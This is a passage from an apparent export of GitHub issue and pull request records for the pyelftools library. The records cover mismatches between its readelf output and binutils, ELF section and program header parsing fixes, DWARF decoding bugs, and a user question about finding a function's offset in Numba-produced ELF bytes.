   Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
-  EXIDX          0x0bb958 0x000c3958 0x000c3958 0x00868 0x00868 R   0x4
+  ARM_EXIDX      0x0bb958 0x000c3958 0x000c3958 0x00868 0x00868 R   0x4
```

Reproduce with this executable:

https://github.com/mzpqnxow/embedded-toolkit/blob/master/prebuilt_static_bins/gdbserver/gdbserver-7.7.1-armel-eabi5-v1-sysv",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/171/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/171/comments,https://api.github.com/repos/eliben/pyelftools/issues/171/events,https://github.com/eliben/pyelftools/issues/171,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/170,276845880,MDU6SXNzdWUyNzY4NDU4ODA=,170,readelf.py doesn't match binutils output for processor specific section header flags,8016228,open,FALSE,NA,NA,1,2017-11-26T18:37:07Z,2020-02-04T14:27:40Z,NA,CONTRIBUTOR,NA,"get_elf_section_flags() is where binutils does this. The discrepancy looks like this:

```
-  [14] .got              PROGBITS        10006c10 14ec10 001438 04  WA  0   0 16
-  [15] .sbss             NOBITS          10008048 150048 0001e8 00  WA  0   0  8
+  [14] .got              PROGBITS        10006c10 14ec10 001438 04 WAp  0   0 16
+  [15] .sbss             NOBITS          10008048 150048 0001e8 00 WAp  0   0  8
```

I'll try to take a stab at this if I get a chance

Reproduce with the following executable:

https://github.com/mzpqnxow/embedded-toolkit/blob/master/prebuilt_static_bins/gdbserver/gdbserver-7.12-mipsel-i-v1-sysv",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/170/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/170/comments,https://api.github.com/repos/eliben/pyelftools/issues/170/events,https://github.com/eliben/pyelftools/issues/170,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/169,276843614,MDU6SXNzdWUyNzY4NDM2MTQ=,169,REGINFO vs ARM_ARCHEXT,8016228,open,FALSE,NA,NA,2,2017-11-26T18:02:04Z,2017-11-26T18:13:06Z,NA,CONTRIBUTOR,NA,"FYI, I came across an inconsistency in binutils and pyelftools when using `readelf -e`

```
-  REGINFO        0x0000e0 0x004000e0 0x004000e0 0x00018 0x00018 R   0x4
+  ARM_ARCHEXT    0x0000e0 0x004000e0 0x004000e0 0x00018 0x00018 R   0x4
```
This is from:
../gdbserver/gdbserver-7.12-mipsel-i-v1-sysv: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, for GNU/Linux 2.2.15, not stripped

To reproduce, access this executable:

https://github.com/mzpqnxow/embedded-toolkit/blob/master/prebuilt_static_bins/gdbserver/gdbserver-7.12-mipsel-i-v1-sysv

I'm not sure which is correct- binutils says the program header is named REGINFO while pyelftools says ARM_ARCHEXT. I assume this is a program header that can occur in multiple architectures and on ARM it has one meaning (ARM_ARCHEXT) while on other architectures it means something else.

I will try to track it down if I have time.

",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/169/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/169/comments,https://api.github.com/repos/eliben/pyelftools/issues/169/events,https://github.com/eliben/pyelftools/issues/169,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/168,276841040,MDExOlB1bGxSZXF1ZXN0MTU0Njg4MzM4,168,Fix merge conflicts for ABIFLAGS branch,8016228,closed,FALSE,NA,NA,1,2017-11-26T17:24:46Z,2017-11-26T21:41:16Z,2017-11-26T21:41:16Z,CONTRIBUTOR,NA,This is a fix for the PR that had a merge conflict in #167 ,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/168/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/168/comments,https://api.github.com/repos/eliben/pyelftools/issues/168/events,https://github.com/eliben/pyelftools/pull/168,https://api.github.com/repos/eliben/pyelftools/pulls/168
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/167,276777119,MDExOlB1bGxSZXF1ZXN0MTU0NjUyMzg2,167,Pt mips abiflags,8016228,closed,FALSE,NA,NA,3,2017-11-25T20:53:26Z,2017-11-26T21:42:32Z,2017-11-26T21:42:31Z,CONTRIBUTOR,NA,"Add leading 0x to Program Headers `Align` to be consistent with binutils readelf

To reproduce, use the following mips64 binary:
    https://github.com/mzpqnxow/embedded-toolkit/blob/master/prebuilt_static_bins/gdbserver/gdbserver-7.12-mips64-mips64rel2-v1-sysv
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/167/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/167/comments,https://api.github.com/repos/eliben/pyelftools/issues/167/events,https://github.com/eliben/pyelftools/pull/167,https://api.github.com/repos/eliben/pyelftools/pulls/167
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/166,276777092,MDU6SXNzdWUyNzY3NzcwOTI=,166,Fix ABIFLAGS and Program Headers hex format to match binutils readelf,8016228,closed,FALSE,NA,NA,2,2017-11-25T20:52:52Z,2017-11-26T23:09:59Z,2017-11-26T23:09:59Z,CONTRIBUTOR,NA,"pyelftools was not picking up PT_MIPS_ABIFLAGS and was printing unknown, while binutils readelf correctly reports ABIFLAGS.

Also fixed Program Header align offset to print a leading 0x for 64 bit programs to match behavior of binutils readelf

Reproduce with the binary available at:

https://github.com/mzpqnxow/embedded-toolkit/blob/master/prebuilt_static_bins/gdbserver/gdbserver-7.12-mips64-mips64rel2-v1-sysv

Pull request will be attached, minor fix",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/166/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/166/comments,https://api.github.com/repos/eliben/pyelftools/issues/166/events,https://github.com/eliben/pyelftools/issues/166,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/165,276773324,MDExOlB1bGxSZXF1ZXN0MTU0NjUwMjk2,165,Many improvements to MIPS flags handling to make output consistent with GNU binutils readelf + typo,8016228,closed,FALSE,NA,NA,8,2017-11-25T19:52:47Z,2017-11-26T17:13:50Z,2017-11-26T13:57:44Z,CONTRIBUTOR,NA,"…roduced by MUSL

pyelftools picked up CPIC but not PIC

binutils readelf says:
  Flags:                             0x1007, noreorder, pic, cpic, o32, mips1

pyelftools said (before this change):
  Flags:                             0x1007, noreorder, cpic, o32, mips1

Reproduce with the binary available at:

https://github.com/mzpqnxow/embedded-toolkit/blob/master/prebuilt_static_bins/gdbserver/gdbserver-6.8-mips-i-rtl819x-lexra",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/165/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/165/comments,https://api.github.com/repos/eliben/pyelftools/issues/165/events,https://github.com/eliben/pyelftools/pull/165,https://api.github.com/repos/eliben/pyelftools/pulls/165
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/164,276773278,MDU6SXNzdWUyNzY3NzMyNzg=,164,Add EF_MIPS_PIC to E_FLAGS to readelf.py to match binutils readelf output,8016228,closed,FALSE,NA,NA,2,2017-11-25T19:52:08Z,2017-11-26T23:09:37Z,2017-11-26T23:09:37Z,CONTRIBUTOR,NA,"    pyelftools picked up CPIC but not PIC
    
    binutils readelf says:
      Flags:                             0x1007, noreorder, pic, cpic, o32, mips1
    
    pyelftools said (before this change):
      Flags:                             0x1007, noreorder, cpic, o32, mips1
    
    Reproduce with the binary available at:
    
    https://github.com/mzpqnxow/embedded-toolkit/blob/master/prebuilt_static_bins/gdbserver/gdbserver-6.8-mips-i-rtl819x-lexra

I will attach a pull request",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/164/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/164/comments,https://api.github.com/repos/eliben/pyelftools/issues/164/events,https://github.com/eliben/pyelftools/issues/164,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/163,276772258,MDExOlB1bGxSZXF1ZXN0MTU0NjQ5Njkz,163,Add TLS and PowerPC to Machine and Program Headers description tables…,8016228,closed,FALSE,NA,NA,0,2017-11-25T19:33:44Z,2017-11-26T13:50:50Z,2017-11-26T13:50:50Z,CONTRIBUTOR,NA,"… to match binutils output

Before:
...
  Machine:                           <unknown>
...
Program Headers:
...
  <unknown>      0x0bcd0c 0x100ccd0c 0x100ccd0c 0x00000 0x00008 R   0x4
...

After:
...
  Machine:                           PowerPC
Program Headers:
...
  TLS            0x0bcd0c 0x100ccd0c 0x100ccd0c 0x00000 0x00008 R   0x4
...

Reproduced and then tested change against statically linked PPC binary produced by MUSL:

https://github.com/mzpqnxow/embedded-toolkit/blob/master/prebuilt_static_bins/gdbserver/gdbserver-7.12-ppc-sysv",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/163/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/163/comments,https://api.github.com/repos/eliben/pyelftools/issues/163/events,https://github.com/eliben/pyelftools/pull/163,https://api.github.com/repos/eliben/pyelftools/pulls/163
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/162,276772232,MDU6SXNzdWUyNzY3NzIyMzI=,162,Unknown Machine and Program Header values with readelf against PPC executable,8016228,closed,FALSE,NA,NA,3,2017-11-25T19:33:17Z,2017-11-26T23:10:16Z,2017-11-26T23:10:16Z,CONTRIBUTOR,NA,"Reproducible using readelf.py -e against the binary @ https://github.com/mzpqnxow/embedded-toolkit/blob/master/prebuilt_static_bins/gdbserver/gdbserver-7.12-ppc-sysv

readelf.py has at least two problems, it shows the TLS program header as unknown and it shows the Machine as unknown. According to GNU binutils readelf, the correct values are PowerPC and TLS.

I will attach a pull request should this be something you would like to address. The changes are very simple and involve only adding a single line to a dict for each issue",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/162/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/162/comments,https://api.github.com/repos/eliben/pyelftools/issues/162/events,https://github.com/eliben/pyelftools/issues/162,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/161,275243881,MDExOlB1bGxSZXF1ZXN0MTUzNTQ4NzY3,161,DIE.__repr__ typo: s/chidren/children/,55290,closed,FALSE,NA,NA,1,2017-11-20T05:49:14Z,2017-11-21T04:54:24Z,2017-11-21T04:54:14Z,CONTRIBUTOR,NA,"Just a simple typo fix,

Thanks,
Alon",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/161/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/161/comments,https://api.github.com/repos/eliben/pyelftools/issues/161/events,https://github.com/eliben/pyelftools/pull/161,https://api.github.com/repos/eliben/pyelftools/pulls/161
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/160,274582989,MDExOlB1bGxSZXF1ZXN0MTUzMDkwNzcx,160,ARM build attributes section parsing,23738463,closed,FALSE,NA,NA,4,2017-11-16T16:39:54Z,2017-11-21T10:52:35Z,2017-11-21T05:00:08Z,CONTRIBUTOR,NA,"Hi Eli,

This answers https://github.com/eliben/pyelftools/issues/75, please tell me if it's ok.

Thank you",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/160/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/160/comments,https://api.github.com/repos/eliben/pyelftools/issues/160/events,https://github.com/eliben/pyelftools/pull/160,https://api.github.com/repos/eliben/pyelftools/pulls/160
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/159,264153028,MDExOlB1bGxSZXF1ZXN0MTQ1NjM2ODc4,159,Fix - ELFFile#address_offsets should consider PT_LOAD only,4191701,closed,FALSE,NA,NA,0,2017-10-10T09:11:23Z,2017-10-13T02:56:30Z,2017-10-13T02:56:30Z,CONTRIBUTOR,NA,"As mentioned in #138 (the second comment)
`ELFFile#address_offsets` should consider PT_LOAD segments only,
otherwise wrong addresses might be yielded.

For example, the readelf output by ```$ readelf -l `which cat` ```:
```
Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000001f8 0x00000000000001f8  R E    0x8
  INTERP         0x0000000000000238 0x0000000000000238 0x0000000000000238
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x000000000000787c 0x000000000000787c  R E    0x200000
  LOAD           0x0000000000007a88 0x0000000000207a88 0x0000000000207a88
                 0x0000000000000638 0x00000000000007d8  RW     0x200000
```

and python script:
```python
import elftools.elf.elffile
f = elftools.elf.elffile.ELFFile(open(""/bin/cat""))
print(list(f.address_offsets(0x40)))
```
Expect: `[64]`
Output: `[64, 64]`

This is because `address_offsets` take the `PHDR` segment into consideration (shouldn't be).
This pr fixed this behavior.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/159/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/159/comments,https://api.github.com/repos/eliben/pyelftools/issues/159/events,https://github.com/eliben/pyelftools/pull/159,https://api.github.com/repos/eliben/pyelftools/pulls/159
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/158,262139983,MDExOlB1bGxSZXF1ZXN0MTQ0MjIzNzI4,158,Wheel support,2248611,closed,FALSE,NA,NA,1,2017-10-02T16:13:41Z,2017-10-04T03:17:19Z,2017-10-04T03:17:09Z,CONTRIBUTOR,NA,"Advantages of wheels
- Faster installation for pure python packages.
- Avoids arbitrary code execution for installation. (Avoids setup.py)
- Allows better caching for testing and continuous integration.
- Creates .pyc files as part of installation to ensure they match the python interpreter used.
- More consistent installs across platforms and machines.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/158/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/158/comments,https://api.github.com/repos/eliben/pyelftools/issues/158/events,https://github.com/eliben/pyelftools/pull/158,https://api.github.com/repos/eliben/pyelftools/pulls/158
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/157,256509455,MDExOlB1bGxSZXF1ZXN0MTQwMjA4NTAx,157,Update the shipped `readelf`,758452,closed,FALSE,NA,NA,0,2017-09-10T13:14:56Z,2017-09-10T16:35:27Z,2017-09-10T16:35:27Z,CONTRIBUTOR,NA,"Hi Eli,

It took me some time to gather the various bits in `readelf.py` in order to be compatible with the last Binutils release, but here we are! :-) Tested with Python2.7 and Python3.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/157/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/157/comments,https://api.github.com/repos/eliben/pyelftools/issues/157/events,https://github.com/eliben/pyelftools/pull/157,https://api.github.com/repos/eliben/pyelftools/pulls/157
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/156,253704379,MDU6SXNzdWUyNTM3MDQzNzk=,156,ELF bytes to function pointer,1852447,closed,FALSE,NA,NA,4,2017-08-29T15:22:14Z,2017-08-31T12:39:30Z,2017-08-31T12:39:30Z,NONE,NA,"This isn't a bug-report per say, but given that you said, ""If you find any part of the documentation lacking..."", I'll ask my question here.

I would like to use pyelftools to find a function pointer in an ELF bytes string. Numba can produce compiled functions, giving me a pointer to the function in local memory and a (hopefully) portable version of the function as an ELF. I want to send the function to a remote site and run it there (on a secured network with known hardware!), so I want to load the ELF as a string and get a new function pointer in the new process.

For example,
```python
>>> import numba
>>> @numba.cfunc(""f8(f8)"", nopython=True)
... def simple_function(x):
...   return x + 3.14
```

It's made to be called locally:
```python
>>> simple_function.address
140625355096096L
>>> import ctypes
>>> f = ctypes.CFUNCTYPE(ctypes.c_double, ctypes.c_double)(simple_function.address)
>>> f(12)
15.14
```

But we can also get the ELF:
```python
>>> elfbytes = simple_function._library._compiled_object
>>> import numpy
>>> numpy.frombuffer(elfbytes).view(numpy.uint8)
array([127,  69,  76,  70,   2,   1,   1,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   1,   0,  62,   0,   1,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0, 160,   1,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
        64,   0,   0,   0,   0,   0,  64,   0,   7,   0,   1,   0,  72,
       184,   0,   0,   0,   0,   0,   0,   0,   0, 242,  15,  88,   0,
        49, 192, 242,  15,  17,   7, 195, 102, 102,  46,  15,  31, 132,
         0,   0,   0,   0,   0,  72, 184,   0,   0,   0,   0,   0,   0,
         0,   0, 242,  15,  88,   0, 195,   0,  31, 133, 235,  81, 184, <- right there!!!
        30,   9,  64,  31, 133, 235,  81, 184,  30,   9,  64,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,  12,   0,   0,   0,
         4,   0, 241, 255,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   3,   0,
         4,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,  79,   0,   0,   0,  18,   0,   2,   0,
         0,   0,   0,   0,   0,   0,   0,   0,  21,   0,   0,   0,   0,
         0,   0,   0,  73,   0,   0,   0,  18,   0,   2,   0,  32,   0,
         0,   0,   0,   0,   0,   0,  15,   0,   0,   0,   0,   0,   0,
         0,   2,   0,   0,   0,   0,   0,   0,   0,   1,   0,   0,   0,
         2,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,  34,
         0,   0,   0,   0,   0,   0,   0,   1,   0,   0,   0,   2,   0,
         0,   0,   8,   0,   0,   0,   0,   0,   0,   0,   0,  46, 114,
       101, 108,  97,  46, 116, 101, 120, 116,   0, 115, 105, 109, 112,
       108, 101,  95, 102, 117, 110,  99, 116, 105, 111, 110,   0,  46,
       110, 111, 116, 101,  46,  71,  78,  85,  45, 115, 116,  97,  99,
       107,   0,  46, 115, 116, 114, 116,  97,  98,   0,  46, 115, 121,
       109, 116,  97,  98,   0,  46, 114, 111, 100,  97, 116,  97,  46,
        99, 115, 116,  56,   0,  99, 102, 117, 110,  99,  46,  95,  95,
       109,  97, 105, 110,  95,  95,  46, 115, 105, 109, 112, 108, 101,
        95, 102, 117, 110,  99, 116, 105, 111, 110,  36,  49,  46, 102,
       108, 111,  97, 116,  54,  52,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,  44,
         0,   0,   0,   3,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,  40,   1,   0,
         0,   0,   0,   0,   0, 114,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   1,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   6,   0,
         0,   0,   1,   0,   0,   0,   6,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,  64,   0,   0,   0,
         0,   0,   0,   0,  47,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,  16,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   0,   0,
         0,   4,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0, 248,   0,   0,   0,   0,
         0,   0,   0,  48,   0,   0,   0,   0,   0,   0,   0,   6,   0,
         0,   0,   2,   0,   0,   0,   8,   0,   0,   0,   0,   0,   0,
         0,  24,   0,   0,   0,   0,   0,   0,   0,  60,   0,   0,   0,
         1,   0,   0,   0,  18,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0, 112,   0,   0,   0,   0,   0,
         0,   0,  16,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   8,   0,   0,   0,   0,   0,   0,   0,
         8,   0,   0,   0,   0,   0,   0,   0,  28,   0,   0,   0,   1,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0, 128,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   1,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,  52,   0,   0,   0,   2,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0, 128,   0,   0,   0,   0,   0,   0,   0,
       120,   0,   0,   0,   0,   0,   0,   0,   1,   0,   0,   0,   3,
         0,   0,   0,   8,   0,   0,   0,   0,   0,   0,   0,  24,   0,
         0,   0,   0,   0,   0,   0], dtype=uint8)
```

Looking at my local pointer for reference, the first 50 bytes after the function pointer is
```python
>>> numpy.ctypeslib.as_array(ctypes.cast(simple_function.address, ctypes.POINTER(ctypes.c_uint8)), (50,))
array([ 72, 184,   8,  48,  86, 228, 229, 127,   0,   0, 242,  15,  88,
         0, 195,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,
         0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0], dtype=uint8)
```
Only the first three bytes (72, 184, 8) and the (0, 0, 242, 15, 88, 0, 195, 0) section are consistent from run to run, with the 8-byte string coming right before a representation of 3.14 (31, 133, 235, 81, 184, 30, 9, 64). I see this starting on byte 117 in the ELF (labeled ""right there"").

So it's in there.

On to pyelftools:
```python
>>> from elftools.elf.elffile import ELFFile
>>> from io import BytesIO
>>> elf = ELFFile(BytesIO(elfbytes))
```

The last section has the symbol table:
```python
>>> list(elf.iter_sections())
[<elftools.elf.sections.NullSection object at 0x7fe5db704710>, <elftools.elf.sections.StringTableSection object at 0x7fe5db704690>, <elftools.elf.sections.Section object at 0x7fe5db704610>, <elftools.elf.relocation.RelocationSection object at 0x7fe5db704590>, <elftools.elf.sections.Section object at 0x7fe5db704810>, <elftools.elf.sections.Section object at 0x7fe5db704950>, <elftools.elf.sections.SymbolTableSection object at 0x7fe5db704990>]
```
and it has the expected symbol names:
```python
>>> [x.name for x in list(elf.iter_sections())[-1].iter_symbols()]
[u'', u'simple_function', u'', u'__main__.simple_function$1.float64', u'cfunc.__main__.simple_function$1.float64']
```
The last one (""`cfunc.__main__.simple_function$1.float64`"") is the function I want. (I can see that by reading the LLVM in `simple_function._library.get_llvm_str()`.)

I see that these `Symbol` objects have an `entry` dict-like, and some of these are numerical offsets, but how do I get the offset from the beginning of the ELF?

That is, if I load the ELF bytes into a Numpy array, how do I use the information from pyelftools to construct an offset relative to the base address of that array? (In other words, how do I do `dlsym` with pyelftools?)

(This ELF doesn't seem to be compatible with the normal `dlopen`/`dlsym` mechanism: writing to a file and doing `ctypes.cdll.LoadLibrary` results in `OSError: /tmp/dummy.so: only ET_DYN and ET_EXEC can be loaded`.)",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/156/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/156/comments,https://api.github.com/repos/eliben/pyelftools/issues/156/events,https://github.com/eliben/pyelftools/issues/156,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/155,253002899,MDExOlB1bGxSZXF1ZXN0MTM3NzQ1Nzg4,155,Add parsing and readelf dumping for .eh_frame,758452,closed,FALSE,NA,NA,3,2017-08-25T19:56:17Z,2017-08-29T02:05:58Z,2017-08-29T02:05:58Z,CONTRIBUTOR,NA,"Hello Eli,

Unlike what I thought on #152, reading and dumping `.eh_frame` is not necessary in order to update the embedded `readelf`.

The diff I got while updating was due to some minor change in output, not to some new dump for `.eh_frame` itself. I noticed that while removing the `.eh_frame` filter in `run_readelf_tests.py`, but by that time I had already implemented most of it, so… here it is, better not throw that away. ;-)",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/155/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/155/comments,https://api.github.com/repos/eliben/pyelftools/issues/155/events,https://github.com/eliben/pyelftools/pull/155,https://api.github.com/repos/eliben/pyelftools/pulls/155
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/154,250838350,MDExOlB1bGxSZXF1ZXN0MTM2MTc5MDY2,154,Minor testsuite improvements,758452,closed,FALSE,NA,NA,0,2017-08-17T06:07:11Z,2017-08-18T01:33:45Z,2017-08-18T01:33:45Z,CONTRIBUTOR,NA,"Hi Eli,

As you know, I’m working on the `readelf` upgrade. :-) In this context, it’s handy to run all related tests even if some of them fail just to see how far I am from a successful run. I hope you’ll find these changes useful as well.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/154/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/154/comments,https://api.github.com/repos/eliben/pyelftools/issues/154/events,https://github.com/eliben/pyelftools/pull/154,https://api.github.com/repos/eliben/pyelftools/pulls/154
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/153,250543055,MDExOlB1bGxSZXF1ZXN0MTM1OTYzMjU2,153,Adding new OS ABI to ELF header parsing,23738463,closed,FALSE,NA,NA,3,2017-08-16T08:03:26Z,2017-08-16T13:16:34Z,2017-08-16T12:18:50Z,CONTRIBUTOR,NA,"Hello,

Please feel free to tell me if you want me to fix/add anything else.

Thanks",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/153/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/153/comments,https://api.github.com/repos/eliben/pyelftools/issues/153/events,https://github.com/eliben/pyelftools/pull/153,https://api.github.com/repos/eliben/pyelftools/pulls/153
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/152,249798437,MDExOlB1bGxSZXF1ZXN0MTM1NDUyOTEy,152,Compressed sections,758452,closed,FALSE,NA,NA,10,2017-08-12T08:41:37Z,2017-08-17T18:41:33Z,2017-08-17T03:52:46Z,CONTRIBUTOR,NA,"Hello,

Assemblers from recent binutils releases compress debug sections, using the `SHF_COMPRESSED` section flag (see http://www.sco.com/developers/gabi/latest/ch4.sheader.html). When pyelftools tries to parse DWARF info in such a section, it crashes in a mysterious way:

```
  File ""/usr/lib/python3.6/site-packages/elftools/elf/elffile.py"", line 174, in get_dwarf_info
    relocate_dwarf_sections)
  File ""/usr/lib/python3.6/site-packages/elftools/elf/elffile.py"", line 402, in _read_dwarf_section
    section_stream, reloc_section)
  File ""/usr/lib/python3.6/site-packages/elftools/elf/relocation.py"", line 124, in apply_section_relocations
    self._do_apply_relocation(stream, reloc, symtab)
  File ""/usr/lib/python3.6/site-packages/elftools/elf/relocation.py"", line 177, in _do_apply_relocation
    stream_pos=reloc['r_offset'])
  File ""/usr/lib/python3.6/site-packages/elftools/common/utils.py"", line 34, in struct_parse
    raise ELFParseError(str(e))
elftools.common.exceptions.ELFParseError: expected 4, found 0
```

This set of commits enhances sections handling to match compressed sections and decompress them when reading their data, fixing crashes such as the above.

Thank you in advance for reviewing, and thank you for this great project! :-)",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/152/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/152/comments,https://api.github.com/repos/eliben/pyelftools/issues/152/events,https://github.com/eliben/pyelftools/pull/152,https://api.github.com/repos/eliben/pyelftools/pulls/152
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/151,241826110,MDU6SXNzdWUyNDE4MjYxMTA=,151,DW_AT_upper_bound is incorrect in certain case,4298770,closed,FALSE,NA,NA,1,2017-07-10T19:47:52Z,2017-07-10T20:53:14Z,2017-07-10T20:53:14Z,NONE,NA,"Language: ADA 95
Compiler: Concurrent
Form: DW_FORM_udata
TAG: 16515 (decimal)
ATTR: DW_AT_upper_bound

Expected value: -1
Actual value: 4294967295

This is also representing a [mod](https://en.wikibooks.org/wiki/Ada_Programming/Types/mod) type in Ada. 

It seems pyelftools is reading the form as unsigned instead of signed and therefore reading the value incorrectly.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/151/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/151/comments,https://api.github.com/repos/eliben/pyelftools/issues/151/events,https://github.com/eliben/pyelftools/issues/151,NA
